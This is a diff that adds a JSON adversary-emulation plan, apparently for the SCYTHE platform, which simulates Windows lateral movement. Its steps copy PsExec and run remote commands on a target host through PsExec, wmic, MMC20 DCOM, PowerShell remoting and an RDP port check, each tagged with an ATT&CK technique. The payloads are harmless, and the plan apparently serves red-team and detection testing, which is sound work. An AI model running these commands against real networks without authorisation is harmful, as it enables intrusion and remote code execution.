@@ -1,0 +1,234 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "A simulation of lateral movement techniques possible on Windows machines.",
+        "display_name": "Lateral-Movement-Windows",
+        "name": "Lateral-Movement-Windows",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "127.0.0.1:443",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c type C:\\emulations\\lateral.txt",
+                "rtags": [],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c $env:TEMP",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 44,
+                            "step": "3",
+                            "xrand": "33148a9f9e3d86e68a5eca86ec79a4f7"
+                        }
+                    ],
+                    "templateString": "--src VFS:/shared/tools/PsExec.exe --dest $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe"
+                },
+                "module": "downloader",
+                "request": "--src VFS:/shared/tools/PsExec.exe --dest $(3).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe",
+                "rtags": [
+                    "att&ck-technique:T1570"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 40,
+                            "step": "3",
+                            "xrand": "33148a9f9e3d86e68a5eca86ec79a4f7"
+                        },
+                        {
+                            "index": 138,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c Start-Process -FilePath $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe -ArgumentList \\\"-accepteula \\\\$(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") ipconfig\\\" -ErrorAction SilentlyContinue -Wait -NoNewWindow"
+                },
+                "module": "run",
+                "request": "powershell -c Start-Process -FilePath $(3).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe -ArgumentList \\\"-accepteula \\\\$(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") ipconfig\\\" -ErrorAction SilentlyContinue -Wait -NoNewWindow",
+                "rtags": [
+                    "att&ck-technique:T1569.002"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 36,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c Test-Path -Path \\\"\\\\$(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\c$\\\" -ErrorAction SilentlyContinue"
+                },
+                "module": "run",
+                "request": "powershell -c Test-Path -Path \\\"\\\\$(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\c$\\\" -ErrorAction SilentlyContinue",
+                "rtags": [
+                    "att&ck-technique:T1021.002"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 20,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "cmd /c wmic /node:$(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") process call create notepad.exe"
+                },
+                "module": "run",
+                "request": "cmd /c wmic /node:$(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") process call create notepad.exe",
+                "rtags": [
+                    "att&ck-technique:T1047"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 94,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c [activator]::CreateInstance([type]::GetTypeFromProgID(\\\"MMC20.application\\\",\\\"$(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\\")).Document.ActiveView.ExecuteShellCommand(\\\"c:\\windows\\system32\\calc.exe\\\",$null,$null,\\\"7\\\")"
+                },
+                "module": "run",
+                "request": "powershell -c [activator]::CreateInstance([type]::GetTypeFromProgID(\\\"MMC20.application\\\",\\\"$(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\\")).Document.ActiveView.ExecuteShellCommand(\\\"c:\\windows\\system32\\calc.exe\\\",$null,$null,\\\"7\\\")",
+                "rtags": [
+                    "att&ck-technique:T1021.003"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 42,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c Get-Process -ComputerName $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -Name *calc* -ErrorAction SilentlyContinue"
+                },
+                "module": "run",
+                "request": "powershell -c Get-Process -ComputerName $(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -Name *calc* -ErrorAction SilentlyContinue",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 45,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c Invoke-Command -ComputerName $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -ScriptBlock {Get-NetIPAddress}"
+                },
+                "module": "run",
+                "request": "powershell -c Invoke-Command -ComputerName $(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -ScriptBlock {Get-NetIPAddress}",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 55,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c $session = New-PSSession -ComputerName $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") ; Invoke-Command -Session $session -Command {hostname;whoami} ; Remove-PSSession -Id $session.ID"
+                },
+                "module": "run",
+                "request": "powershell -c $session = New-PSSession -ComputerName $(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") ; Invoke-Command -Session $session -Command {hostname;whoami} ; Remove-PSSession -Id $session.ID",
+                "rtags": [
+                    "att&ck-technique:T1021.006"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": {
+                    "dependsOnSteps": [
+                        {
+                            "index": 49,
+                            "step": "2",
+                            "xrand": "c5caabd857fb81d480a086fe55e35b05"
+                        }
+                    ],
+                    "templateString": "powershell -c Test-NetConnection -ComputerName $(^).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -Port 3389"
+                },
+                "module": "run",
+                "request": "powershell -c Test-NetConnection -ComputerName $(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") -Port 3389",
+                "rtags": [
+                    "att&ck-technique:T1021.001",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
